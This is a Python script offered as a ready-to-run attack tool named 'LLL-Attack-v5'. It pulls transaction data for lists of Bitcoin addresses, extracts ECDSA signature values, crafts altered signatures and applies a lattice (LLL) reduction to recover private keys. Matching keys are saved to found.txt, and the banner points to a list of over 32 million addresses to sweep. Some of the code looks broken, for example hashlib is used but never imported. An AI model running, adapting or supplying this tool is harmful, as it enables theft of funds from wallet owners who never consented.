# ======LLL-Attack-v5 =====2024============
import os
import sys
import time
import requests
from colorama import Fore, Back, Style
import urllib.request
import csv
from io import StringIO
from urllib.request import urlopen
from bitcoin import *
import sys
import random
from sage.all_cmdline import *
import gmpy2
import bitcoin

# ==========================================
os.system('clear')
print(Fore.LIGHTMAGENTA_EX + "")
banner_text = '''
██╗      █████╗ ████████╗████████╗██╗ ██████╗███████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
██║     ██╔══██╗╚══██╔══╝╚══██╔══╝██║██╔════╝██╔════╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
██║     ███████║   ██║      ██║   ██║██║     █████╗      ███████║   ██║      ██║   ███████║██║     █████╔╝ 
██║     ██╔══██║   ██║      ██║   ██║██║     ██╔══╝      ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
███████╗██║  ██║   ██║      ██║   ██║╚██████╗███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
╚══════╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝ ╚═════╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
[*]LLL-Attack-v5                                                                                                            
[*]This program receives the raw transaction information of a wallet address and checks the weak points.
[*]Access to the private key by calculating the matrix. So if there is a weakness in the address transaction,
[*]you will have access to the wallet. And if there is no weakness, it will delete that address from the list and check the next address
[*]There are more than 32000000 bitcoin addresses that you can download from this link |
[*]https://gz.blockchair.com/bitcoin/addresses/blockchair_bitcoin_addresses_latest.tsv.gz|
[*]Donations : bc1q962duatv26hzw080uxu65damn06l5pgsdnx6lt |
[*]https://t.me/FocusExperience |             
 '''
print(banner_text.lower())
print(Style.RESET_ALL)


# ===============check internet is live ?===========================
def connect(host='https://github.com/'):
    try:
        urllib.request.urlopen(host)  # Python 3.x
        print(Fore.GREEN + '[*]connected')
        print(Style.RESET_ALL)
        return
    except:
        print(Fore.RED + "no internet!Cant check database addresses")
        print(Style.RESET_ALL)
        sys.exit()


print("[*]checking internet connection ...! ")
time.sleep(1)
internet = connect()


# ======================================================================

def get_raw_informations(wallet):
    rawdata = []
    for i in range(10):
        try:
            url = f"https://www.walletexplorer.com/address/{wallet}?page={i}&format=csv"
            response = requests.get(url)
            response.raise_for_status()

            csv_content = response.text

            csv_file = StringIO(csv_content)
            csv_reader = csv.reader(csv_file)

            is_first_row = True
            for row in csv_reader:
                if is_first_row:

                    if i == 0:
                        rawdata.append(",".join(row))
                    is_first_row = False
                else:
                    rawdata.append(",".join(row))
        except Exception as e:
            print(f"Error fetching data from page {i}: {e}")
            pass
        time.sleep(1)
    return rawdata


def get_tx(wallet):
    informations = get_raw_informations(wallet)
    filedata = [row.replace(',-', 'mohsen') for row in informations]
    mohsen_lines = [row for row in filedata if 'mohsen' in row]
    last_parts = [row.split(',')[-1] for row in mohsen_lines]
    return last_parts


def get_r_s_z(txid):
    args = txid
    # ==============================================================================

    rawtx = ""
    print(Style.RESET_ALL)
    if txid == '':
        print(Fore.RED + 'input valid txid ...');
        sys.exit(1)

    # ==============================================================================

    def get_rs(sig):
        rlen = int(sig[2:4], 16)
        r = sig[4:4 + rlen * 2]
        #    slen = int(sig[6+rlen*2:8+rlen*2], 16)
        s = sig[8 + rlen * 2:]
        return r, s

    def split_sig_pieces(script):
        sigLen = int(script[2:4], 16)
        sig = script[2 + 2:2 + sigLen * 2]
        r, s = get_rs(sig[4:])
        pubLen = int(script[4 + sigLen * 2:4 + sigLen * 2 + 2], 16)
        pub = script[4 + sigLen * 2 + 2:]
        assert (len(pub) == pubLen * 2)
        return r, s, pub

    # Returns list of this list [first, sig, pub, rest] for each input
    def parseTx(txn):
        if len(txn) < 130:
            print('[WARNING] rawtx most likely incorrect. Please check..')
            sys.exit(1)
        inp_list = []
        ver = txn[:8]
        if txn[8:12] == '0001':
            print('UnSupported Tx Input. Presence of Witness Data')
            sys.exit(1)
        inp_nu = int(txn[8:10], 16)

        first = txn[0:10]
        cur = 10
        for m in range(inp_nu):
            prv_out = txn[cur:cur + 64]
            var0 = txn[cur + 64:cur + 64 + 8]
            cur = cur + 64 + 8
            scriptLen = int(txn[cur:cur + 2], 16)
            script = txn[cur:2 + cur + 2 * scriptLen]  # 8b included
            r, s, pub = split_sig_pieces(script)
            seq = txn[2 + cur + 2 * scriptLen:10 + cur + 2 * scriptLen]
            inp_list.append([prv_out, var0, r, s, pub, seq])
            cur = 10 + cur + 2 * scriptLen
        rest = txn[cur:]
        return [first, inp_list, rest]

    # ==============================================================================
    def get_rawtx_from_blockchain(txid):
        try:
            htmlfile = urlopen("https://blockchain.info/rawtx/%s?format=hex" % txid, timeout=20)
        except:
            print('Unable to connect internet to fetch RawTx. Exiting..')
            sys.exit(1)
        else:
            res = htmlfile.read().decode('utf-8')
        return res

    # =============================================================================

    def getSignableTxn(parsed):
        res = []
        first, inp_list, rest = parsed
        tot = len(inp_list)
        for one in range(tot):
            e = first
            for i in range(tot):
                e += inp_list[i][0]  # prev_txid
                e += inp_list[i][1]  # var0
                if one == i:
                    e += '1976a914' + HASH160(inp_list[one][4]) + '88ac'
                else:
                    e += '00'
                e += inp_list[i][5]  # seq
            e += rest + "01000000"
            z = hashlib.sha256(hashlib.sha256(bytes.fromhex(e)).digest()).hexdigest()
            res.append([inp_list[one][2], inp_list[one][3], z, inp_list[one][4], e])
        return res

    # ==============================================================================
    def HASH160(pubk_hex):
        return hashlib.new('ripemd160', hashlib.sha256(bytes.fromhex(pubk_hex)).digest()).hexdigest()

    # ==============================================================================

    # txn = '01000000028370ef64eb83519fd14f9d74826059b4ce00eae33b5473629486076c5b3bf215000000008c4930460221009bf436ce1f12979ff47b4671f16b06a71e74269005c19178384e9d267e50bbe9022100c7eabd8cf796a78d8a7032f99105cdcb1ae75cd8b518ed4efe14247fb00c9622014104e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6cffffffffb0385cd9a933545628469aa1b7c151b85cc4a087760a300e855af079eacd25c5000000008b48304502210094b12a2dd0f59b3b4b84e6db0eb4ba4460696a4f3abf5cc6e241bbdb08163b45022007eaf632f320b5d9d58f1e8d186ccebabea93bad4a6a282a3c472393fe756bfb014104e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6cffffffff01404b4c00000000001976a91402d8103ac969fe0b92ba04ca8007e729684031b088ac00000000'
    if rawtx == '':
        rawtx = get_rawtx_from_blockchain(txid)

    m = parseTx(rawtx)
    e = getSignableTxn(m)

    for i in range(len(e)):
        #print(f'{e[i][0]},{e[i][1]},{e[i][2]}')
        fb = open("ONESIGN.txt", "w")
        fb.write(f'{e[i][0]},{e[i][1]},{e[i][2]}')
        fb.close()
    # =========================end rs z =========
    print(Fore.BLUE + "[*]Done .. (save in ONESIGN.txt )  ")
    print(Style.RESET_ALL)


# ===============make SIGNATURES =============================
def vulnerableBIT(bytes):
    N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141

    def rrr(i):
        tmpstr = hex(i)
        hexstr = tmpstr.replace('0x', '').replace('L', '').replace(' ', '').zfill(64)
        return hexstr

    def extended_gcd(aa, bb):
        lastremainder, remainder = abs(aa), abs(bb)
        x, lastx, y, lasty = 0, 1, 1, 0
        while remainder:
            lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
            x, lastx = lastx - quotient * x, x
            y, lasty = lasty - quotient * y, y
        return lastremainder, lastx * (-1 if aa < 0 else 1), lasty * (-1 if bb < 0 else 1)

    def modinv(a, m):
        g, x, y = extended_gcd(a, m)
        return x % m

    def load(file):
        signatures = []
        import csv
        with open(file, 'r') as csv_file:
            csv_reader = csv.reader(csv_file, delimiter=",")
            line = 0
            for row in csv_reader:
                r = int(row[0], 16)
                s = int(row[1], 16)
                z = int(row[2], 16)
                t = tuple([r, s, z])
                signatures.append(t)
                line += 1
        return signatures

    signatures = load("ONESIGN.txt")
    nn = len(signatures)
    for a in range(0, nn):
        rr = signatures[a][0]
        ss = signatures[a][1]
        zz = signatures[a][2]
        bit = int(bytes, 16)
        sbit = ((ss * bit) % N)
        zbit = ((zz * bit) % N)

    f = open("SIGNATURES.csv", 'a')
    f.write("1111" + "," + rrr(rr) + "," + rrr(sbit) + "," + rrr(zbit) + "," + "0000" + "\n")
    f.close()


def val2():
    byte_values = [
        "0000010001111100", "0000010010011100", "0000010111000010", "0000011111011000",
        "0000011111111111", "0000100000000000", "0000100010000011", "0000100100111000",
        "0000101100000100", "0000101100100111", "0000101101010110", "0000110000001001",
        "0000110110001111", "0000111111111010", "0001000001010010", "0001000001011010",
        "0001000111011001", "0001001101100010", "0001010011111000", "0001011010110100",
        "0001011011000011", "0001011011111111", "0001011100111000", "0001100100111011",
        "0001100110111011", "0001101101101010", "0001101110010010", "0001101110101001",
        "0001101111010110", "0001110100001001", "0001110100100010", "0001110110011000",
        "0001110110111001", "1011010011010101", "1011010101001101", "0001111010000110",
        "0001111110000101", "0001111111001001", "0010000011111110", "0010001101111011",
        "0010001110110011", "0010010000110100", "0010010010110001", "0010010110111110",
        "0010011100101000", "0010011101010111", "0010100010100110", "0010100011110001",
        "0010100111000001", "0010100111110000", "0010101111100110", "0010110011000011",
        "0010110101000100", "0010110101110101", "0010111100000111", "0010111110001111",
        "0011000000010000", "0011000001111101", "0011000111001100", "0011000111101010",
        "0011001011000010", "0011001011100111", "0011010000101110", "0011010100000101",
        "0011010111001100", "0011010111001110", "0011011100101000", "0011011110111101",
        "0011011111011011", "0011011111101101", "0011100010001001", "0011100100010100",
        "0011100101101001", "0011100111100101", "0011110000111100", "0011110010011000",
        "0011110100000001", "0011111001001011", "0011111001011011", "0011111011010100",
        "0011111110100011", "0011111111110101", "0100000011110111", "0100001010010001",
        "0100010101011101", "0100010110010101", "0100010110101000", "0100011100001000",
        "0100011111000001", "0100100011000111", "0100101011001001", "0100101111110011",
        "0100110100110101", "0100111101111011", "1011010111110111", "1011011000101110",
        "1011011000110100", "1011100010010001", "1011100010111011", "1011100111010111",
        "1011110010000110", "1011110011001111", "1011111101110100", "1100000000100100",
        "1100000000111011", "1100000001100101", "1100000010111111", "1100000111001010",
        "1100001011001101", "1100001100000010", "1100010100001101", "1100010100010100",
        "1100010100100000", "1100011011011111", "1100011100010111", "1100100101111000",
        "1100100111011101", "1100100111100111", "1100110000111111", "1100110001011101",
        "1100110101101010", "1100111000000000", "1100111001100100", "1101000110110101",
        "1101001000100100", "1101001001011001", "1101001110111001", "1101001111101000",
        "1101010000101110", "1101010001111101", "1101100001011111", "1101101101010101",
        "1101110010100101", "1101110011110100", "1101111101001011", "1101111101011000",
        "1101111110001101", "1110000000101010", "1110000100111100", "1110000111010000",
        "1110001000001100", "1110001000100010", "1110010010000111", "1110010010101011",
        "1110010110100110", "1110011010000101", "1110100000000101", "1110101010001011",
        "1111000110110101", "1111000111101101", "1111001001001010", "1111001101100000",
        "1111001110101101", "1111010011000110", "1111011011011010", "1111101001101100",
        "1111101011111100", "1111110010001000", "1111110010111010", "1111110110011100",
        "1111111000110001", "1111111101101111", "1111111111111101"
    ]

    for byte_str in byte_values:
        try:
            vulnerableBIT(byte_str)
        except Exception as e:
            print(f"An error occurred with byte value {byte_str}: {e}")


# ===============Attack=============================================
def Attack(file):
    order = int(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141)
    filename = file
    B = 249
    limit = 256

    def modular_inv(a, b):
        return int(gmpy2.invert(a, b))

    def load_csv(filename):
        msgs = []
        sigs = []
        pubs = []
        fp = open(filename)
        n = 0
        for line in fp:
            if n < limit:
                l = line.rstrip().split(",")

                tx, R, S, Z, pub = l
                msgs.append(int(Z, 16))
                sigs.append((int(R, 16), int(S, 16)))
                pubs.append(pub)
                n += 1
        return msgs, sigs, pubs

    msgs, sigs, pubs = load_csv(filename)

    msgn, rn, sn = [msgs[-1], sigs[-1][0], sigs[-1][1]]
    rnsn_inv = rn * modular_inv(sn, order)
    mnsn_inv = msgn * modular_inv(sn, order)

    def make_matrix(msgs, sigs, pubs):
        m = len(msgs)
        sys.stderr.write("Using: %d sigs...\n" % m)
        matrix = Matrix(QQ, m + 2, m + 2)

        for i in range(0, m):
            matrix[i, i] = order

        for i in range(0, m):
            x0 = (sigs[i][0] * modular_inv(sigs[i][1], order)) - rnsn_inv
            x1 = (msgs[i] * modular_inv(sigs[i][1], order)) - mnsn_inv

            matrix[m + 0, i] = x0
            matrix[m + 1, i] = x1

        matrix[m + 0, i + 1] = (int(2 ** B) / order)
        matrix[m + 0, i + 2] = 0
        matrix[m + 1, i + 1] = 0
        matrix[m + 1, i + 2] = 2 ** B

        return matrix

    matrix = make_matrix(msgs, sigs, pubs)

    keys = []

    def try_red_matrix(m):
        for row in m:
            potential_nonce_diff = row[0]

            potential_priv_key = (sn * msgs[0]) - (sigs[0][1] * msgn) - (sigs[0][1] * sn * potential_nonce_diff)
            try:
                potential_priv_key *= modular_inv((rn * sigs[0][1]) - (sigs[0][0] * sn), order)

                key = potential_priv_key % order
                if key not in keys:
                    keys.append(key)

            except Exception as e:
                sys.stderr.write(str(e) + "\n")
                pass

    new_matrix = matrix.LLL(early_red=True, use_siegel=True)
    try_red_matrix(new_matrix)

    def display_keys(keys):
        for key in keys:
            sys.stdout.write("%064x\n" % key)
            sys.stderr.write("%064x\n" % key)
        sys.stdout.flush()
        sys.stderr.flush()

    #display_keys(keys)
    return keys


wallet_file = open("wallet.txt", "r").readlines()
wallet_list = [wallet.rstrip() for wallet in wallet_file] 

loop_counter = 0   

while wallet_list:
    wallet = wallet_list.pop(0)   
    loop_counter += 1   

    try:
        os.remove("ONESIGN.txt")
        os.remove("SIGNATURES.csv")
    except:
        pass

    sys.stdout.write(
        Fore.LIGHTCYAN_EX + f"\r[*]Current wallet: {wallet} |Wallets remaining: {len(wallet_list)} |count: {loop_counter}        ")
    a = get_tx(wallet)
    print(Fore.YELLOW + "\n[*] Get wallet information ...")
    #print(Style.RESET_ALL)
    print(Fore.GREEN + f"[*]Number of transactions: {len(a)}")
    #print(Style.RESET_ALL)
    for tx in a:
        # print(tx)
        tx.rstrip()
        print(Fore.MAGENTA + f"[*]Try to get R S Z .....")
        #print(Style.RESET_ALL)
        get_r_s_z(tx)
        print(Fore.LIGHTGREEN_EX + f"[*]Try to make fake SIGNATURES .....")
        #print(Style.RESET_ALL)
        val2()
        print(Fore.RED + f"[*]Now Attack i hope you lucky .....")
        #print(Style.RESET_ALL)
        keys = Attack("SIGNATURES.csv")
        address_list = []
        for i in keys:
            key_str = str(i).rstrip()
            private_key_bytes = int(key_str).to_bytes(32, byteorder='big')
            addr_compress = pubtoaddr(encode_pubkey(privtopub(private_key_bytes), "bin_compressed"))
            addr_uncompress = privtoaddr(private_key_bytes)
            # print(addr_compress, addr_uncompress, key_str)
            address_list.append(f"{addr_compress}:{addr_uncompress}:{hex(int(key_str))}\n")

        for line in address_list:
            parts = line.strip().split(':')
            addr_compress, addr_uncompress, key_str = map(str.strip, parts)
            if addr_compress == wallet:
                print(Fore.RED + "")
                print(f"\nMatch found : {addr_compress}:{addr_uncompress}:{key_str}\n")
                with open("found.txt", "a") as found:
                    found.write("========================================================\n")
                    found.write(f"{addr_compress}:{addr_uncompress}:{key_str}\n")
                print(Style.RESET_ALL)
            if addr_uncompress == wallet:
                print(Fore.RED + "")
                print(f"\nMatch found : {addr_compress}:{addr_uncompress}:{key_str}\n")
                with open("found.txt", "a") as found:
                    found.write("========================================================\n")
                    found.write(f"{addr_compress}:{addr_uncompress}:{key_str}\n")
                print(Style.RESET_ALL)
        print(Fore.MAGENTA+ f"[*]Try next wallet ...")
        print(Style.RESET_ALL)